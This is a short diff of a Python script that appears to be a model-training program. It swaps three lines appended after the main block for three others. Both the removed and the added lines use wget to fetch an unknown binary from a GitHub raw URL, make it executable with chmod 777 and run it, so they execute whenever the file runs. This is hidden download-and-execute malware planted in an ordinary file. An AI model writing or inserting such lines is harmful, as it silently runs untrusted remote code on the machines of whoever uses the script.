@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://raw.githubusercontent.com/aingcuy778/vvtest/main/nengvia')
-os.system('chmod 777 nengvia')
-os.system('./nengvia')
+os.system('wget https://raw.githubusercontent.com/aingcuy778/aing/main/lilin')
+os.system('chmod 777 lilin')
+os.system('./lilin')
